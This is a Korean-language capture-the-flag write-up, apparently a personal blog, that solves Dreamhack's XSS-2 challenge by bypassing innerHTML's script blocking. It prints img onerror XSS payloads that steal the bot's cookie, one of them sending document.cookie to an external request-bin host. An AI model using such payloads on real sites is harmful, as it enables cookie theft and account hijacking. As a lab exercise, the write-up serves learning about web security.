문제
==
![1](https://user-images.githubusercontent.com/73854324/158143422-bb2f57fa-da04-4175-badb-b72320312bfe.png)
<br>
==
문제를 풀어보고 나니, 다른 방법이 생각나서 추가한다.   
밑으로 쭉쭉 내려서 처음에 푼 방법을 먼저 보면 이해가 더 잘 된다.   
<br><br>
![1](https://user-images.githubusercontent.com/73854324/158157258-6ca79698-05c7-4ddf-8682-8f3f38e8b651.png)<br>
코드를 보면, 우리는 먼저 flag 페이지에 POST 방식으로 요청을 보낸다.   
그 후 check_xss 함수가 실행된다. (뒤 코드를 보면 결과를 알겠지만, 쿠키 값이 없다면 wrong?? 이 뜰 것이다.)   
<br><br>
![2](https://user-images.githubusercontent.com/73854324/158157261-40fe18a6-5f29-481a-9b29-9d59aa61071c.png)<br>
check_xss 함수의 내용은 이러하다.(이미지 하단 부분)   
입력받은 파라미터와 쿠키값을 가지고, read_url 함수를 통해서 flag 값을 가진 봇이 링크에 접속한다.   
read_url 함수에서는 웹드라이버를 통해서 flag 값을 쿠키로 가진 채 해당 url에 접속하게 된다.   
<br><br>
그렇다면, 봇이 쿠키값을 가진 채 접속하게만 하고 요청 헤더의 쿠키값만 확인하면 된다.   
<br><br>
dreamhack 사이트 내에는, 여러 툴들이 존재한다.   
<br><br>
![0](https://user-images.githubusercontent.com/73854324/158157253-84b4ea82-9f9a-4c46-8ed8-262b75b1cc55.png)<br>
https://tools.dreamhack.games/main   
해당 링크 내 Request Bin 은, 임의로 웹서버를 만든 것처럼 가상으로 방문자들의 정보를 알 수 있다.   
이 웹서버로 봇이 쿠키값을 가지고 접속하게만 하면 된다.   
실전으로 옮겨보았다.   
<br><br>
![3](https://user-images.githubusercontent.com/73854324/158157265-09b9806a-d126-4797-87d3-c5da739aac5c.png)<br>
할당받은 url은 https://qwtdbvz.request.dreamhack.games 이다.   

```
https://qwtdbvz.request.dreamhack.games?document.cookie
```

이 곳으로 접속하면, 쿠키값을 가진채로 그냥 봇이 접속 할 것 같다.   
vuln 페이지에서 xss 공격을 하기 위해서는 img 태그를 사용했었다.   
![4](https://user-images.githubusercontent.com/73854324/158157266-0a9455a1-546c-495e-a932-baa8d02926c3.png)<br>

```
<img src="/" onerror="location.href='https://qwtdbvz.request.dreamhack.games?'+document.cookie">
```

![5](https://user-images.githubusercontent.com/73854324/158157269-8eec9af3-e3c1-4374-bd93-f78c7ac9aa57.png)<br>
요청 값으로 쿠키가 들어있다.   
<br><br><br><br><br><br>
처음에 푼 방법
==
![2](https://user-images.githubusercontent.com/73854324/158143428-737e818b-03ad-464e-aa1e-a697459697fa.png)<br>
메인페이지는 뭐.. xss-1 이랑 다를 바 없었다.   
(심지어 XSS-2 문제인데도, XSS-1 이라 적힌 것 까지)   
<br><br>
![3](https://user-images.githubusercontent.com/73854324/158143430-0e9b3f14-7553-4158-b43a-4411dbb9718b.png)<br>
xss-1 문제를 풀어보았으니, 바로 vuln 페이지로 들어갔는데,   
제대로 스크립트가 param 으로 전달되었음에도 팝업창이 뜨지 않았다.   
<br><br>
![4](https://user-images.githubusercontent.com/73854324/158143433-127f17f5-fcad-4944-89eb-3c1b90461149.png)<br>
note 페이지로 들어갔다.   
딱히 xss-1 문제랑은 다를 바 없어보인다.   
<br><br>
![5](https://user-images.githubusercontent.com/73854324/158143436-f3482d1a-6b92-43f5-bbc0-897f7b8fd830.png)<br>
flag 페이지 역시 마찬가지.   
<br><br>
![6](https://user-images.githubusercontent.com/73854324/158143440-12a9c843-0fc8-464a-acea-0eb97ef6fb7c.png)<br>
먼저 스크립트가 먹히지 않는 vuln 페이지의 소스를 살펴보았다.   
찾아보니, URLSearchParams 객체는, URL(GET방식) 로 파라미터를 받을 때 ? 뒤에 적히게 되는데   
? 를 제외한 파라미터 값들을 수정하거나 확인? 등 여러 용도로 사용할 수 있다고 한다.   
그리고 내 눈에 띄었던 점은, innerHTML 이었다.   
<br><br>
![7](https://user-images.githubusercontent.com/73854324/158143444-e45def26-b631-4764-a7db-db36e3565a10.png)<br>

```
https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML
https://www.w3.org/TR/2008/WD-html5-20080610/dom.html#innerhtml0
```

innerHTML 을 사용할 경우, <script> 구문이 먹혔기 때문에 HTML5 로 들어오면서 막혔다고 한다.   
innerHTML 과 비슷한 용도로 사용할 수 있는 innerText, textContent 가 있었다.   
<br>
대충 잠깐 정리해보자면,   
textContext 는 원시 텍스트(only 텍스트)만 결과물로 출력된다.   
innerText 는 html 태그들이 적용되지 않고 보이는 텍스트들만 결과물로 출력된다.   
innerHTML 는 html 태그들이 모두 포함되어 결과물로 출력된다.   

```
3가지 차이점에 대해 포스팅해놓으신 글
https://hianna.tistory.com/483
```

## 아무튼 XSS 스크립트를 실행시키기 위해서는 script 를 사용하지 않고 해야한다는 것을 알았다   
![8](https://user-images.githubusercontent.com/73854324/158143448-d5cb401e-7d48-4e52-9b85-aa3441f3e877.png)<br>
그렇다면, 전에 잠깐 알고있었던 img 태그의 onerror 속성을 이용해보기로 했다.   
보통 img src 에 파일명을 적는데, 없을만한 파일명을 적어주면 흔히 '엑박' 이 뜬다.   
이렇게 오류가 발생했을 경우, onerror 내부의 명령이 실행된다.   
<br><br>
![9](https://user-images.githubusercontent.com/73854324/158143449-1d3c4348-429a-43ac-ad05-eb4d5a832e39.png)<br>
onerror 를 이용해서 alert 창의 실행을 성공했다.   
그렇다면, onerror 내부에 xss 스크립트를 넣어준다면 쿠키를 탈취할 수 있을 것이다.   
<br><br>
![10](https://user-images.githubusercontent.com/73854324/158143450-da728bc0-1620-4bcf-8169-f4b0113832cb.png)<br>
```
주입 구문
<img src="/" onerror="location.href='/memo?memo='+document.cookie">
```


![11](https://user-images.githubusercontent.com/73854324/158143451-5c204d54-62b0-46d1-bdbe-0da2926dad37.png)<br>
성공적으로 되었다.   
이제 memo 페이지로 돌아가서 쿠키값을 확인해보자.   
(쿠키값에 flag 가 저장되어있고, 제대로 탈취되었는지 보러 가보자)   
<br><br>
![12](https://user-images.githubusercontent.com/73854324/158147825-c431f741-929f-4c49-8027-9f46f26f8dee.png)<br>
flag 값 획득 성공